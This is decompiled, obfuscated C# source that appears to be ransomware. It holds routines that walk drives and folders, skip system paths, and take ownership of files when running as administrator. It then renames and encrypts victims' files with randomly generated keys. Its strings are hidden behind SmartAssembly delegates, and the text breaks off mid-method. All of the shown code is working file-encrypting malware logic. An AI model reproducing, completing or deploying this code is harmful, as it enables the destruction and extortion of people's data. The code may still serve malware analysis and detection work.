using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using iDURBOBwZUYAa;
using uxJZpPHZaFNzux;

namespace wDtIYaxdpawEu;

internal sealed class OwCGWssNrah
{
	public sealed class lfFHEFlmfCqW
	{
		private static StringCollection UOJHfBFssXrY;

		private static List<string> IHERLZpUYbiWtQbI;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107349540));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107349535)) && !text.ToLower().Contains(getString_0(107349546)) && !text.ToLower().Contains(getString_0(107400972)) && !text.ToLower().Contains(getString_0(107400927)) && !text.ToLower().Contains(getString_0(107349501)) && !text.ToLower().Contains(getString_0(107401323)) && !text.ToLower().Contains(getString_0(107401264)) && !text.ToLower().Contains(getString_0(107401215)) && !text.ToLower().Contains(getString_0(107401230)) && !text.ToLower().Contains(getString_0(107401181)) && !text.ToLower().Contains(getString_0(107401147)) && !text.ToLower().Contains(getString_0(107401162)) && !text.ToLower().Contains(getString_0(107401113)) && !text.ToLower().Contains(getString_0(107401132)) && !text.ToLower().Contains(getString_0(107401079)) && !text.ToLower().Contains(getString_0(107401098)) && !text.ToLower().Contains(getString_0(107400541)) && !text.ToLower().Contains(getString_0(107400556)) && !text.ToLower().Contains(getString_0(107400507)) && !text.Contains(iBDvjzxzEcC(getString_0(107400522))) && !text.Contains(getString_0(107400497)) && !text.Contains(getString_0(107400452)) && !text.EndsWith(getString_0(107395289)) && !text.EndsWith(getString_0(107400459)) && !text.EndsWith(getString_0(107400422)) && !text.EndsWith(getString_0(107400417)) && !text.EndsWith(getString_0(107400412)) && !text.ToLower().Contains(getString_0(107400407)) && !text.ToLower().Contains(COjZSLMnxffln))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(nPUtTAwIhKI) * 1024.0 * 1024.0 && CoRisaOZQor == getString_0(107396855))
							{
								IHERLZpUYbiWtQbI.Add(text);
							}
							else if (File.Exists(text) && CoRisaOZQor == getString_0(107397112))
							{
								IHERLZpUYbiWtQbI.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return IHERLZpUYbiWtQbI;
		}

		static lfFHEFlmfCqW()
		{
			Strings.CreateGetStringDelegate(typeof(lfFHEFlmfCqW));
			UOJHfBFssXrY = new StringCollection();
			IHERLZpUYbiWtQbI = new List<string>();
		}
	}

	private sealed class GLfKfCJiKTIW
	{
		public string gvllsCCLJzdL;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == gvllsCCLJzdL;
		}
	}

	private sealed class CvtvsehZvVox
	{
		public string OfutQEOgrcWV;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__19(int int_0)
		{
			Thread.Sleep(gcVeDsTCahqU);
			uneznyCLJqjxYvh.Add(getString_0(107400372) + OfutQEOgrcWV + getString_0(107396780) + (char)int_0 + getString_0(107349519));
			try
			{
				if (RxwgNpmsCUXw)
				{
					Console.WriteLine(getString_0(107400372) + OfutQEOgrcWV + getString_0(107396780) + (char)int_0 + getString_0(107349519));
				}
			}
			catch
			{
			}
		}

		static CvtvsehZvVox()
		{
			Strings.CreateGetStringDelegate(typeof(CvtvsehZvVox));
		}
	}

	private sealed class PbhoBWPuGhtGLm
	{
		public string RFtwrSGCcXR;

		public bool _003CIsDriveNTFS_003Eb__1e(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == RFtwrSGCcXR;
		}
	}

	private sealed class nmLGDsygJvrP
	{
		private sealed class cfAeuBOBEL
		{
			public nmLGDsygJvrP MBRxLCUcDRcQHo;

			public string VdTMxUweOcfiCauJn;

			public void _003CCrypt_003Eb__28()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					zrnHsDHKDix(WindowsIdentity.GetCurrent().Name, VdTMxUweOcfiCauJn);
				}
			}

			public void _003CCrypt_003Eb__29()
			{
				aBmTBQOumL(VdTMxUweOcfiCauJn, MBRxLCUcDRcQHo.ebJNjDLXrhXbmH, MBRxLCUcDRcQHo.BiToJaAkWyjSw, MBRxLCUcDRcQHo.TsUefJDxWOuiS, MBRxLCUcDRcQHo.DTBKtELBieK);
			}
		}

		public string[] ebJNjDLXrhXbmH;

		public string[] TsUefJDxWOuiS;

		public string DTBKtELBieK;

		public string BiToJaAkWyjSw;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__27(string string_0)
		{
			cfAeuBOBEL CS_0024_003C_003E8__locals0 = new cfAeuBOBEL();
			CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo = this;
			CS_0024_003C_003E8__locals0.VdTMxUweOcfiCauJn = string_0;
			if (ZdPTJTivRQPn && !kkttwGmMPePa().Contains(getString_0(107397935)) && !kkttwGmMPePa().Contains(getString_0(107397831)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						zrnHsDHKDix(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.VdTMxUweOcfiCauJn);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (CYtyMsjHbrwM == getString_0(107396864))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					aBmTBQOumL(CS_0024_003C_003E8__locals0.VdTMxUweOcfiCauJn, CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo.ebJNjDLXrhXbmH, CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo.BiToJaAkWyjSw, CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo.TsUefJDxWOuiS, CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo.DTBKtELBieK);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				aBmTBQOumL(CS_0024_003C_003E8__locals0.VdTMxUweOcfiCauJn, ebJNjDLXrhXbmH, BiToJaAkWyjSw, TsUefJDxWOuiS, DTBKtELBieK);
			}
		}

		static nmLGDsygJvrP()
		{
			Strings.CreateGetStringDelegate(typeof(nmLGDsygJvrP));
		}
	}

	private sealed class dOYydSKoLzIp
	{
		private sealed class nnITftDnrHBk
		{
			public dOYydSKoLzIp EqCJrbOGYCEo;

			public string BmoNJexcODDCT;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__35()
			{
				foreach (string item in UaltDtqfmMVTAX)
				{
					if (BmoNJexcODDCT.ToLower().EndsWith(item + EqCJrbOGYCEo.EonUYJCKfDwF) && cGDFQVDbXvzo == getString_0(107396875))
					{
						if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > new FileInfo(BmoNJexcODDCT).Length)
						{
							try
							{
								orMQkbNvmzZPsHt.pBYlYRXdmUuSS(getString_0(107402204), getString_0(107402167), getString_0(107402186), BmoNJexcODDCT);
							}
							catch
							{
							}
						}
					}
					else if (BmoNJexcODDCT.ToLower().EndsWith(item) && cGDFQVDbXvzo == getString_0(107397132))
					{
						try
						{
							orMQkbNvmzZPsHt.pBYlYRXdmUuSS(getString_0(107402204), getString_0(107402167), getString_0(107402186), BmoNJexcODDCT);
						}
						catch
						{
						}
					}
				}
			}

			static nnITftDnrHBk()
			{
				Strings.CreateGetStringDelegate(typeof(nnITftDnrHBk));
			}
		}

		private sealed class lMWNgthKPX
		{
			public dOYydSKoLzIp EqCJrbOGYCEo;

			public string hGfHXtUEXE;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__37()
			{
				foreach (string item in UaltDtqfmMVTAX)
				{
					if (hGfHXtUEXE.ToLower().EndsWith(item + EqCJrbOGYCEo.EonUYJCKfDwF) && cGDFQVDbXvzo == getString_0(107396878))
					{
						if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > new FileInfo(hGfHXtUEXE).Length)
						{
							try
							{
								orMQkbNvmzZPsHt.pBYlYRXdmUuSS(getString_0(107402207), getString_0(107402170), getString_0(107402189), hGfHXtUEXE);
							}
							catch
							{
							}
						}
					}
					else if (hGfHXtUEXE.ToLower().EndsWith(item) && cGDFQVDbXvzo == getString_0(107397135))
					{
						try
						{
							orMQkbNvmzZPsHt.pBYlYRXdmUuSS(getString_0(107402207), getString_0(107402170), getString_0(107402189), hGfHXtUEXE);
						}
						catch
						{
						}
					}
				}
			}

			static lMWNgthKPX()
			{
				Strings.CreateGetStringDelegate(typeof(lMWNgthKPX));
			}
		}

		public List<string> mKFRqpeTOqw;

		public List<string> mBwKTyYUMnTK;

		public string EonUYJCKfDwF;

		public string[] qEiHtzqbfmL;

		public string QsejQwxWKSqe;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__34(string string_0)
		{
			nnITftDnrHBk CS_0024_003C_003E8__locals0;
			foreach (string item in mBwKTyYUMnTK)
			{
				if (item.Contains(getString_0(107401032)) || item.Contains(getString_0(107401007)) || item.Contains(getString_0(107400974)) || item.ToLower().Contains(getString_0(107400989)) || item.ToLower().Contains(getString_0(107400944)) || item.Contains(getString_0(107400919)) || item.Contains(getString_0(107400930)) || item.ToLower().Contains(getString_0(107400885)) || item.ToLower().Contains(getString_0(107400872)) || item.ToLower().Contains(getString_0(107400867)) || item.ToLower().Contains(getString_0(107400858)) || item.ToLower().Contains(getString_0(107401321)) || item.ToLower().Contains(getString_0(107401295)) || item.ToLower().Contains(getString_0(107401306)) || item.Contains(getString_0(107401281)) || item.Contains(getString_0(107401232)) || item.Contains(getString_0(107401247)) || item.Contains(getString_0(107401198)) || item.Contains(getString_0(107401213)) || item.Contains(getString_0(107401164)) || item.Contains(getString_0(107401179)) || item.Contains(getString_0(107401130)) || item.Contains(getString_0(107401149)) || item.Contains(getString_0(107401096)) || item.ToLower().Contains(getString_0(107401115)) || item.ToLower().Contains(getString_0(107400558)) || item.ToLower().Contains(getString_0(107400573)) || item.ToLower().Contains(getString_0(107400524)) || item.Contains(iBDvjzxzEcC(getString_0(107400539))) || item.Contains(getString_0(107400514)) || item.Contains(getString_0(107396757)) || item.Contains(getString_0(107400469)) || item.EndsWith(EonUYJCKfDwF) || item.EndsWith(getString_0(107400476)) || item.EndsWith(getString_0(107400439)) || item.EndsWith(getString_0(107400434)) || item.EndsWith(getString_0(107400429)) || item.Contains(getString_0(107400424)) || item.Contains(COjZSLMnxffln) || item.Contains(ndioqUCcjeEwRygxn) || item.Contains(zSigBrcrKLvB))
				{
					continue;
				}
				if (qEiHtzqbfmL.Length != 0)
				{
					string[] array = qEiHtzqbfmL;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0e93;
					}
				}
				try
				{
					if (item.EndsWith(EonUYJCKfDwF))
					{
						goto IL_0e93;
					}
				}
				catch (Exception)
				{
					goto IL_0e93;
				}
				if (!item.EndsWith(string_0) || fQuiHGzOTAlx.Contains(item))
				{
					continue;
				}
				if (FiFLjMAxemfbt == getString_0(107396872))
				{
					try
					{
						if (BpsCidXmje.XYkowLVgnLlObar(item))
						{
							BpsCidXmje.ZKDZsMJwTeH(item);
						}
					}
					catch
					{
					}
				}
				fQuiHGzOTAlx.Add(item);
				if (!kEshrQncftX.Contains(Path.GetDirectoryName(item)))
				{
					kEshrQncftX.Add(Path.GetDirectoryName(item));
				}
				bncyMjJFXOqmi(item);
				try
				{
					new fqIueWgOQEK().uUMSRroBuQWna(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (RxwgNpmsCUXw)
							{
								Console.WriteLine(getString_0(107349528) + item + getString_0(107349451) + new FileInfo(item).Length + getString_0(107349430));
								Console.WriteLine(getString_0(107349421));
							}
						}
						catch
						{
						}
						pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107348836)), getString_0(107400340) + item + getString_0(107400340) + iBDvjzxzEcC(getString_0(107348779)) + getString_0(107400340) + Environment.UserName + getString_0(107400340) + iBDvjzxzEcC(getString_0(107348794)));
					}
				}
				catch (Exception ex2)
				{
					if (SBPYnaSzKyFP)
					{
						try
						{
							File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107398621) + item + getString_0(107348769) + ex2.Message + getString_0(107396703));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (SBPYnaSzKyFP)
						{
							try
							{
								File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107398621) + item + getString_0(107348656) + ex4.Message + getString_0(107396703));
							}
							catch (Exception)
							{
							}
						}
						PuPUesizAwkkz++;
						goto end_IL_0716;
					}
					if (eUAtnXtzwCVQtt == getString_0(107396872) && new FileInfo(item).Length > Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024 && !mKFRqpeTOqw.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new nnITftDnrHBk();
						CS_0024_003C_003E8__locals0.EqCJrbOGYCEo = this;
						try
						{
							if (EonUYJCKfDwF != getString_0(107397849))
							{
								if (lHJbFcHZdNnC)
								{
									EonUYJCKfDwF = GrEoYlDdrrJcnWE + EonUYJCKfDwF;
								}
								File.Move(item, item + EonUYJCKfDwF);
							}
						}
						catch (Exception ex6)
						{
							if (SBPYnaSzKyFP)
							{
								try
								{
									File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107398621) + item + getString_0(107349107) + ex6.Message + getString_0(107396703));
								}
								catch (Exception)
								{
								}
							}
							PuPUesizAwkkz++;
							goto end_IL_0716;
						}
						CS_0024_003C_003E8__locals0.BmoNJexcODDCT = getString_0(107401576);
						if (EonUYJCKfDwF != getString_0(107397849))
						{
							CS_0024_003C_003E8__locals0.BmoNJexcODDCT = item + EonUYJCKfDwF;
						}
						else
						{
							CS_0024_003C_003E8__locals0.BmoNJexcODDCT = item;
						}
						if (cGbDMszYvGe == getString_0(107396872))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in UaltDtqfmMVTAX)
								{
									if (CS_0024_003C_003E8__locals0.BmoNJexcODDCT.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.EqCJrbOGYCEo.EonUYJCKfDwF) && cGDFQVDbXvzo == nnITftDnrHBk.getString_0(107396875))
									{
										if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.BmoNJexcODDCT).Length)
										{
											try
											{
												orMQkbNvmzZPsHt.pBYlYRXdmUuSS(nnITftDnrHBk.getString_0(107402204), nnITftDnrHBk.getString_0(107402167), nnITftDnrHBk.getString_0(107402186), CS_0024_003C_003E8__locals0.BmoNJexcODDCT);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.BmoNJexcODDCT.ToLower().EndsWith(item2) && cGDFQVDbXvzo == nnITftDnrHBk.getString_0(107397132))
									{
										try
										{
											orMQkbNvmzZPsHt.pBYlYRXdmUuSS(nnITftDnrHBk.getString_0(107402204), nnITftDnrHBk.getString_0(107402167), nnITftDnrHBk.getString_0(107402186), CS_0024_003C_003E8__locals0.BmoNJexcODDCT);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = JNEDQxTiGyvPh.XoKGyJzEnHtiLD(32);
						string text2 = getString_0(107401576);
						text2 = (IflXfWBKZN ? JNEDQxTiGyvPh.QdOxughxMncJD() : getString_0(107401576));
						string s = PtmCzzxPcg.UDDTmPOlNfmsO(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (PurCmZibxBamv == getString_0(107397129))
						{
							byte[] array2 = null;
							byte[] byte_ = scvFMtYlVeb.hpGAnTLbaTEeN(CS_0024_003C_003E8__locals0.BmoNJexcODDCT, Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024);
							if (scvFMtYlVeb.mtRrTfokQWXkK(DNBUuDIlXHcMv: (!FmiPpRhQSBxQ) ? (IflXfWBKZN ? scvFMtYlVeb.AIyOtGwWrXEZ(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : scvFMtYlVeb.AIyOtGwWrXEZ(byte_, Convert.FromBase64String(QsejQwxWKSqe), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IflXfWBKZN ? CiqamKuyrt.uZhbCYxeOxuMJx(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : CiqamKuyrt.uZhbCYxeOxuMJx(byte_, Convert.FromBase64String(QsejQwxWKSqe), Convert.FromBase64String(eUUqvSerqkEdI))), MLqpVyadMeGdgmK: CS_0024_003C_003E8__locals0.BmoNJexcODDCT, kRGGWEuoppgYu: bytes))
							{
								goto IL_0e93;
							}
							try
							{
								File.Move(item + EonUYJCKfDwF, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!IflXfWBKZN)
						{
							if (QfVKvNIzyJTRTFb.nPDNQoqIpmrky(CS_0024_003C_003E8__locals0.BmoNJexcODDCT, XLyVBayizjzN, QsejQwxWKSqe, null, Convert.FromBase64String(eUUqvSerqkEdI)))
							{
								goto IL_0e93;
							}
							try
							{
								File.Move(item + EonUYJCKfDwF, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (QfVKvNIzyJTRTFb.nPDNQoqIpmrky(CS_0024_003C_003E8__locals0.BmoNJexcODDCT, XLyVBayizjzN, text, bytes, Convert.FromBase64String(text2)))
							{
								goto IL_0e93;
							}
							try
							{
								File.Move(item + EonUYJCKfDwF, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (lHJbFcHZdNnC)
					{
						EonUYJCKfDwF = GrEoYlDdrrJcnWE + EonUYJCKfDwF;
					}
					string text3 = JNEDQxTiGyvPh.XoKGyJzEnHtiLD(32);
					string text4 = getString_0(107401576);
					text4 = (IflXfWBKZN ? JNEDQxTiGyvPh.QdOxughxMncJD() : getString_0(107401576));
					string s2 = PtmCzzxPcg.UDDTmPOlNfmsO(text3 + text4);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (EonUYJCKfDwF != getString_0(107397849))
					{
						if (!yNTMpjtZXpajKX)
						{
							if (!IflXfWBKZN)
							{
								uHCaJlttjzbyG(item, item + EonUYJCKfDwF, dZNuvPCEnaSnNI);
							}
							else
							{
								uHCaJlttjzbyG(item, item + EonUYJCKfDwF, Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!IflXfWBKZN)
								{
									eZxZiohcedVC(item, item + EonUYJCKfDwF, dZNuvPCEnaSnNI, Convert.FromBase64String(eUUqvSerqkEdI));
								}
								else
								{
									eZxZiohcedVC(item, item + EonUYJCKfDwF, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex11)
							{
								if (SBPYnaSzKyFP)
								{
									try
									{
										File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107398621) + item + getString_0(107397803) + ex11.Message + getString_0(107396703));
									}
									catch (Exception)
									{
									}
								}
								PuPUesizAwkkz++;
								try
								{
									File.Move(item + EonUYJCKfDwF, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_0716;
							}
						}
					}
					else if (!yNTMpjtZXpajKX)
					{
						if (!IflXfWBKZN)
						{
							uHCaJlttjzbyG(item, item + getString_0(107397812), dZNuvPCEnaSnNI);
						}
						else
						{
							uHCaJlttjzbyG(item, item + getString_0(107397812), Convert.FromBase64String(text3));
						}
					}
					else
					{
						try
						{
							if (!IflXfWBKZN)
							{
								eZxZiohcedVC(item, item, dZNuvPCEnaSnNI, Convert.FromBase64String(eUUqvSerqkEdI));
							}
							else
							{
								eZxZiohcedVC(item, item, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
							}
						}
						catch (Exception ex14)
						{
							if (SBPYnaSzKyFP)
							{
								try
								{
									File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107398621) + item + getString_0(107397803) + ex14.Message + getString_0(107396703));
								}
								catch (Exception)
								{
								}
							}
							PuPUesizAwkkz++;
							goto end_IL_0716;
						}
					}
					if (IflXfWBKZN)
					{
						if (EonUYJCKfDwF != getString_0(107397849))
						{
							HiuKKSnyYq(item + EonUYJCKfDwF, bytes2);
						}
						else
						{
							HiuKKSnyYq(item, bytes2);
						}
					}
					goto IL_0e93;
					end_IL_0716:;
				}
				catch (Exception)
				{
					goto IL_0e93;
				}
				continue;
				IL_0e93:
				mBwKTyYUMnTK.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__36(string string_0)
		{
			lMWNgthKPX CS_0024_003C_003E8__locals0 = new lMWNgthKPX();
			CS_0024_003C_003E8__locals0.EqCJrbOGYCEo = this;
			CS_0024_003C_003E8__locals0.hGfHXtUEXE = string_0;
			if (!CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401032)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401007)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400974)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107400989)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107400944)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400919)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400930)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107400885)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107400872)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107400867)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107400858)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107401321)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107401295)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107401306)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401281)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401232)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401247)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401198)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401213)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401164)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401179)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401130)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401149)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401096)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107401115)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107400558)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107400573)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107400524)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(iBDvjzxzEcC(getString_0(107400539))) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400514)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107396757)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400469)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(EonUYJCKfDwF) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(getString_0(107400476)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(getString_0(107400439)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(getString_0(107400434)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(getString_0(107400429)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400424)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(COjZSLMnxffln) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(ndioqUCcjeEwRygxn) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(zSigBrcrKLvB))
			{
				if (qEiHtzqbfmL.Length != 0)
				{
					string[] array = qEiHtzqbfmL;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1069;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(EonUYJCKfDwF))
					{
						goto IL_1069;
					}
				}
				catch (Exception)
				{
					goto IL_1069;
				}
				if (!fQuiHGzOTAlx.Contains(CS_0024_003C_003E8__locals0.hGfHXtUEXE))
				{
					if (FiFLjMAxemfbt == getString_0(107396872))
					{
						try
						{
							if (BpsCidXmje.XYkowLVgnLlObar(CS_0024_003C_003E8__locals0.hGfHXtUEXE))
							{
								BpsCidXmje.ZKDZsMJwTeH(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
							}
						}
						catch
						{
						}
					}
					fQuiHGzOTAlx.Add(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
					if (!kEshrQncftX.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hGfHXtUEXE)))
					{
						kEshrQncftX.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hGfHXtUEXE));
					}
					bncyMjJFXOqmi(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
					try
					{
						new fqIueWgOQEK().uUMSRroBuQWna(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.hGfHXtUEXE, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (RxwgNpmsCUXw)
								{
									Console.WriteLine(getString_0(107349528) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107349451) + new FileInfo(CS_0024_003C_003E8__locals0.hGfHXtUEXE).Length + getString_0(107349430));
									Console.WriteLine(getString_0(107349421));
								}
							}
							catch
							{
							}
							pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107348836)), getString_0(107400340) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107400340) + iBDvjzxzEcC(getString_0(107348779)) + getString_0(107400340) + Environment.UserName + getString_0(107400340) + iBDvjzxzEcC(getString_0(107348794)));
						}
					}
					catch (Exception ex2)
					{
						if (SBPYnaSzKyFP)
						{
							try
							{
								File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107398621) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107348769) + ex2.Message + getString_0(107396703));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.hGfHXtUEXE).Length != 0L)
							{
								goto end_IL_085c;
							}
							goto end_IL_085c_2;
							end_IL_085c:;
						}
						catch (Exception ex4)
						{
							if (SBPYnaSzKyFP)
							{
								try
								{
									File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107398621) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107348656) + ex4.Message + getString_0(107396703));
								}
								catch (Exception)
								{
								}
							}
							PuPUesizAwkkz++;
							goto end_IL_085c_2;
						}
						if (eUAtnXtzwCVQtt == getString_0(107396872) && new FileInfo(CS_0024_003C_003E8__locals0.hGfHXtUEXE).Length > Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024)
						{
							try
							{
								if (EonUYJCKfDwF != getString_0(107397849))
								{
									if (lHJbFcHZdNnC)
									{
										EonUYJCKfDwF = GrEoYlDdrrJcnWE + EonUYJCKfDwF;
									}
									File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF);
								}
							}
							catch (Exception ex6)
							{
								if (SBPYnaSzKyFP)
								{
									try
									{
